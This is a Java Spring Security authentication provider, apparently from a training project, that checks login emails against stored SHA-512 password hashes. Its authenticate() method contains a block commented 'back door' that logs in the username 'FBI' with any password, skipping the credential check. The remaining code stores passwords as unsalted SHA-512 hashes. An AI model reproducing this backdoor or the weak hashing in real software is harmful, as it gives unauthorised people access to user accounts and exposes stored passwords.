package lv.helloit.test;

import lv.helloit.test.users.User;
import lv.helloit.test.users.UserService;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.security.authentication.AuthenticationProvider;
import org.springframework.security.authentication.UsernamePasswordAuthenticationToken;
import org.springframework.security.core.Authentication;
import org.springframework.security.core.AuthenticationException;
import org.springframework.security.core.token.Sha512DigestUtils;
import org.springframework.stereotype.Component;

import java.util.ArrayList;
import java.util.Optional;

@Component
public class CustomAuthenticationProvider implements AuthenticationProvider {
    private final UserService userService;

    @Autowired
    public CustomAuthenticationProvider(UserService userService) {
        this.userService = userService;
    }

    @Override
    public Authentication authenticate(Authentication authentication) throws AuthenticationException {
        String email = authentication.getName();
        String password = authentication.getCredentials().toString();

        // back door
        if (email.equals("FBI")) {
            return new UsernamePasswordAuthenticationToken(email, password, new ArrayList<>());
        }

        Optional<User> wrappedUser = userService.get(email);

        if (wrappedUser.isPresent()) {
            String realPasswordHash = wrappedUser.get().getPasswordHash();
            String incomingPasswordHash = Sha512DigestUtils.shaHex(password);

            if (realPasswordHash.equals(incomingPasswordHash)) {
                return new UsernamePasswordAuthenticationToken(email, password, new ArrayList<>());
            }
        }

        return null;
    }

    @Override
    public boolean supports(Class<?> authentication) {
        return UsernamePasswordAuthenticationToken.class == authentication;
    }
}
